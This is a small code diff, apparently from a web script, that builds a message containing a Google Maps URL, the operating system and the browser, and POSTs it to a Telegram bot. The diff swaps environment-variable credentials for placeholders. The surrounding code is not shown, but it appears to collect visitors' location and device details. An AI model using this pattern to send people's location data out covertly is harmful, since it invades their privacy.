@@ -209,8 +209,8 @@ Google Maps: ${googleMapsUrl}
 Operating System: ${os}
 Browser: ${browser}
             `;
-const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
-const chatId = process.env.TELEGRAM_CHAT_ID;
+const telegramBotToken = 'PLACEHOLDER_TOKEN';
+const chatId = 'PLACEHOLDER_CHAT_ID';
             try {
                 let response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                     method: 'POST',
